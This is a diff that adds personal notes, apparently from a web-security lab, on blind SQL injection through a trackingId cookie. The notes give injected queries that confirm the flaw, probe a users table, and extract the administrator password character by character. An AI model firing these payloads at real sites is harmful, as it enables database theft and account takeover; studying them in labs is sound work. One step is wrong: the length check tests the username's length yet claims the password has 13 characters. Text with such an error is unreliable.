@@ -1,0 +1,43 @@
+Blind SQLi - trackingId cookie
+
+"Welcome back" message if the query returns any rows.
+
+db - `users` table with `username`, `password` columns.
+
+
+Goal: 
+1- Enumerate the password of the user 'administrator'
+2- login as the user 'administrator'
+
+
+Process:
+
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' -> base query -> welcome message.
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzHSOMETHING' -> no welcome message.
+
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and 1=1--' -> welcome message
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and 1=2--' -> no welcome message
+
+- that means there's a blind sql injection
+
+Prove that there's a table called `users`:
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select 'x' from users LIMIT 1)='x' --' -> Welcome back > there's a table called users;
+
+Prove that there's a `username` column and username value called `administrator`:
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select username from users WHERE username='administrator')='administrator' --' -> Welcome back -> there's username column and an entry called administrator
+
+Enumerate over the length of `administrator` user:
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select username from users WHERE username='administrator' and LENGTH(username)>1)='administrator' --' -> Burp Intruder -> password has ***13*** chars.
+
+Enumerate every char in the password:
+SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select substring(password,$i$,1) from users WHERE username='administrator')='$j$' --' -> if we got welcome message, that means the first char is 'a'
+
+
+
+
+
+
+
+
+
+
